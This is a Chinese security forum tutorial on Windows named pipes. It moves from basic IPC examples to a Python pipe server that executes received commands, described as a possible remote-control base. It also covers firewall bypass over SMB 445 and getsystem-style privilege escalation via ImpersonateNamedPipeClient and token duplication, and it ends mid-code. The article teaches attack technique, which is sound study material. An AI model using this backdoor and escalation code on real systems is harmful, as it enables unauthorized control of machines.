---
title: Pipe管道利用
url: https://forum.butian.net/share/4041
source: 奇安信攻防社区
date: 2025-01-17
fetch_date: 2025-10-06T20:04:31.871949
---

# Pipe管道利用

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### Pipe管道利用

关于Pipe管道的安全技术分享

`P`ipe管道利用
==========
在 Windows 操作系统中，\*\*管道（Pipe）\*\* 是一种进程间通信（IPC）的机制，允许数据在两个进程之间传输。管道有两种主要类型：\*\*匿名管道\*\*和\*\*命名管道\*\*。以下是它们的详细介绍：
### 1. \*\*匿名管道（Anonymous Pipe）\*\*
### 特点：
- \*\*单向通信\*\*：数据只能单向流动（从一个进程的输出流到另一个进程的输入流）。
- \*\*进程关系\*\*：通常用于父子进程之间的通信。
- \*\*使用限制\*\*：只能在同一台计算机上使用，不能用于网络通信。
### 典型用例：
- 父进程创建匿名管道，并将其句柄传递给子进程，允许父子进程共享数据。
- 例如，使用匿名管道从子进程中捕获输出（如命令行工具输出）。
### 示例：
在 C/C++ 中，匿名管道可以通过 `CreatePipe` 创建：
```php
HANDLE hReadPipe, hWritePipe;
SECURITY\_ATTRIBUTES sa = { sizeof(SECURITY\_ATTRIBUTES), NULL, TRUE };
if (CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
// 使用管道进行数据通信
}
```
### 2. \*\*命名管道（Named Pipe）\*\*
### 特点：
- \*\*双向通信\*\*：支持双向或单向通信。
- \*\*进程关系\*\*：可以在不同的进程间通信，甚至可以跨网络通信（同一网络中的不同主机）。
- \*\*命名机制\*\*：每个命名管道都有一个唯一的名称，客户端可以通过名称访问它。
- \*\*并发支持\*\*：同一个管道可以同时被多个客户端连接。
### 典型用例：
- 用于客户端与服务器之间的通信。
- 网络通信：允许应用程序跨计算机传输数据。
- 实现复杂的进程间通信。
### 示例：
创建命名管道：
```php
HANDLE hPipe = CreateNamedPipe(
TEXT("\\\\.\\pipe\\MyPipe"), // 管道名
PIPE\_ACCESS\_DUPLEX, // 双向读写
PIPE\_TYPE\_MESSAGE | PIPE\_READMODE\_MESSAGE | PIPE\_WAIT, // 消息模式
PIPE\_UNLIMITED\_INSTANCES, // 最大实例数
512, 512, // 输出和输入缓冲区大小
0, // 默认超时时间
NULL // 安全属性
);
if (hPipe != INVALID\_HANDLE\_VALUE) {
// 等待客户端连接
ConnectNamedPipe(hPipe, NULL);
// 进行数据读写
}
```
客户端连接管道：
```php
HANDLE hPipe = CreateFile(
TEXT("\\\\.\\pipe\\MyPipe"), // 管道名
GENERIC\_READ | GENERIC\_WRITE, // 读写权限
0, // 不共享
NULL, // 默认安全属性
OPEN\_EXISTING, // 打开现有管道
0, // 默认属性
NULL // 无模板文件
);
```
使用python实现一下这个功能
服务端代码：
```php
import subprocess
import win32pipe
import win32file
PIPE\_NAME = r"\\.\pipe\MyPipe"
def command\_execute(command):
"""执行命令并返回输出"""
try:
result = subprocess.run(command, shell=True, capture\_output=True, text=True)
return result.stdout + result.stderr
except Exception as e:
return f"Error executing command: {str(e)}"
def start\_pipe\_server():
print(f"Starting server at pipe: {PIPE\_NAME}")
# 创建命名管道
pipe = win32pipe.CreateNamedPipe(
PIPE\_NAME,
win32pipe.PIPE\_ACCESS\_DUPLEX, # 双向通信
win32pipe.PIPE\_TYPE\_MESSAGE | win32pipe.PIPE\_WAIT,
1, # 最大连接数
65536, # 输出缓冲区大小
65536, # 输入缓冲区大小
0,
None
)
print("Waiting for client connection...")
# 等待客户端连接
win32pipe.ConnectNamedPipe(pipe, None)
print("Client connected!")
while True:
try:
print("Waiting for a message...")
# 读取客户端发送的数据
result, message = win32file.ReadFile(pipe, 4096)
print(f"Received message: {message.decode('utf-8')}")
if message.decode('utf-8').strip().lower() == "exit":
print("Exit command received. Closing server.")
break
# 回复客户端
output = command\_execute(message.decode('utf-8').strip())
win32file.WriteFile(pipe, output.encode('utf-8')) # 返回结果
except Exception as e:
return f"Client auto close: {str(e)}"
# 关闭管道
win32file.CloseHandle(pipe)
print("Pipe closed.")
if \_\_name\_\_ == "\_\_main\_\_":
start\_pipe\_server()
```
客户端代码：
```php
import win32file
import win32pipe
PIPE\_NAME = r"\\.\pipe\MyPipe"
def connect\_to\_pipe():
print(f"Connecting to pipe: {PIPE\_NAME}")
# 连接到命名管道
handle = win32file.CreateFile(
PIPE\_NAME,
win32file.GENERIC\_READ | win32file.GENERIC\_WRITE,
0,
None,
win32file.OPEN\_EXISTING,
0,
None
)
print("Connected to server.")
return handle
def send\_message(pipe\_handle, message):
print(f"Sending message: {message}")
win32file.WriteFile(pipe\_handle, message.encode('utf-8'))
# 读取服务端的回复
result, response = win32file.ReadFile(pipe\_handle, 4096)
print(f"Server response: {response.decode('utf-8')}")
if \_\_name\_\_ == "\_\_main\_\_":
pipe = connect\_to\_pipe()
# 发送测试消息
send\_message(pipe, "calc")
send\_message(pipe, "exit") # 发送退出命令
# 关闭管道
win32file.CloseHandle(pipe)
print("Client disconnected.")
```
执行效果（感兴趣可以开发为远控）：
[![](https://cdn.nlark.com/yuque/0/2024/png/32674752/1734350707824-d7ce73ca-8515-4cf6-b092-50ff3afce450.png)](https://cdn.nlark.com/yuque/0/2024/png/32674752/1734350707824-d7ce73ca-8515-4cf6-b092-50ff3afce450.png)
[![](https://cdn.nlark.com/yuque/0/2024/png/32674752/1734350708006-0d30cf29-5f04-4f86-9842-69191f16c118.png)](https://cdn.nlark.com/yuque/0/2024/png/32674752/1734350708006-0d30cf29-5f04-4f86-9842-69191f16c118.png)
[![](https://cdn.nlark.com/yuque/0/2024/png/32674752/1734350708090-e4436879-9f77-495e-9a67-3edb4dd261ed.png)](https://cdn.nlark.com/yuque/0/2024/png/32674752/1734350708090-e4436879-9f77-495e-9a67-3edb4dd261ed.png)
其编程代码风格很像socks的编程，都是创建 ，监听，接收，返回，关闭。
\*\*管道实现的分离免杀\*\*
-------------
可以跟倾旋的文章：<https://payloads.online/archivers/2019-11-10/5>
绕过防火墙的限制
--------
### \*\*远程命名管道\*\*
- \*\*使用 SMB 协议（Server Message Block）\*\*：跨主机通信的命名管道依赖于 SMB 协议，而 SMB 本身默认在以下端口上工作：
- \*\*TCP 445\*\*：这是现代 SMB 协议的默认端口。
- \*\*TCP 139\*\*（较旧的 SMB 协议版本可能使用）。
可以想到在防火墙限制很多端口时可以选择445，因为大部分windows的445端口都是默认放行，感兴趣的话可以研究研究创建远程管道
### \*\*准备工作\*\*
- 确保 \*\*SMB 服务（Server Message Block）\*\* 已在两台主机上启用。通常，这涉及启用文件和打印机共享，并确保防火墙允许访问 \*\*TCP 445\*\* 端口。
- 确保在两台主机之间建立了网络连接，并且远程主机上存在适当的访问权限。
- 为了安全起见，可以配置命名管道的 \*\*安全描述符（Security Descriptor）\*\*。
必须想将IPC$进行net use 绑定才可以使用远程管道
\*\*msf的getsystem基本原理\*\*
---------------------
1. \*\*命名管道\*\*：是 Windows 系统进程间通信的一种方式，支持跨网络的通信。
2. \*\*冒充客户端\*\*：当具有高权限的客户端（如 SYSTEM）连接到攻击者创建的命名管道时，攻击者通过 `ImpersonateNamedPipeClient` 冒充该客户端的安全上下文，从而获得与客户端相同的权限。
### \*\*攻击流程\*\*
1. \*\*创建命名管道\*\*：使用 `CreateNamedPipe` 函数创建一个命名管道。
2. \*\*等待客户端连接\*\*：使用 `ConnectNamedPipe` 等待目标系统中的高权限进程连接到该管道。
3. \*\*调用冒充函数\*\*：使用 `ImpersonateNamedPipeClient` 函数切换当前线程的安全上下文为连接者的上下文。
4. \*\*提权操作\*\*：利用获得的高权限执行提权操作，如创建进程、修改文件等。
```php
#include<stdio.h>
#include<windows.h>
int main() {
HANDLE hPipe = NULL;
HANDLE tokenHandle = NULL;
HANDLE newtokenHandle = NULL;
STARTUPINFO startupInfo;
startupInfo.cb = sizeof(STARTUPINFO);
PROCESS\_INFORMATION processInformation;
wchar\_t recv\_buf[1024] = { 0 };
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS\_INFORMATION));
hPipe = CreateNamedPipe(L"\\\\.\\pipe\\myServerPipe", PIPE\_ACCESS\_DUPLEX, PIPE\_READMODE\_BYTE | PIPE\_WAIT, PIPE\_UNLIMITED\_INSTANCES, 1024, 1024, 0, NULL);
if (hPipe == INVALID\_HANDLE\_VALUE) {
printf("CreatePipe Failed");
CloseHandle(hPipe);
}
printf("[+] CreateNamedPipe Successfully\n");
//服务端在这里会进行堵塞，等待客户端进行连接
if (ConnectNamedPipe(hPipe, NULL)) {
printf("[+] ConnectNamedPipe Successfully\n");
//用于使调用线程模仿（impersonate）通过命名管道（named pipe）连接的客户端的安全上下文。
if (ImpersonateNamedPipeClient(hPipe) == 0) {
printf("[!] Error impersonating client %d\n", GetLastError());
CloseHandle(hPipe);
return -1;
}
printf("[+] ImpersonateNamedPipeClient Successfully\n");
//用于打开与当前线程相关联的访问令牌
if (!OpenThreadToken(GetCurrentThread(), TOKEN\_ALL\_ACCESS, FALSE, &tokenHandle)) {
printf("[!] Error opening thread token %d\n", GetLastError());
CloseHandle(hPipe);
return -1;
}
printf("[+] OpenThreadToken Successfully\n");
//复制现有的访问令牌，并允许对新令牌进行一定的定制化处理。
if (!DuplicateTokenEx(tokenHandle, TOKEN\_ALL\_ACCESS, NULL, SecurityDelegation, TokenPrimary, &newtokenHandle)) {
printf("[!] Error duplicating thread token %d\n", GetLastError());
CloseHandle(hPipe);
return -1;
}
printf("[+] DuplicateTokenEx Successfully\n");
wchar\_t cmdPath[MAX\_PATH] = L"c:\\windows\\system32\\cmd.exe";
//这个函数允许在具有特定身份验证的情况下启动一个新进程
if (!CreateProcessWithTokenW(newtokenHandle, LOGON\_NETCREDENTIALS\_ONLY, NULL, cmdPath, NULL, NULL, NULL, (LPSTARTUPINFOW)&startupInfo, &processInformation)) {
printf("[!] CreateProcessWithTokenW Failed (%d).\n", GetLastError());
CloseHandle(hPipe);
return -1;
}
printf("[+] CreatePro...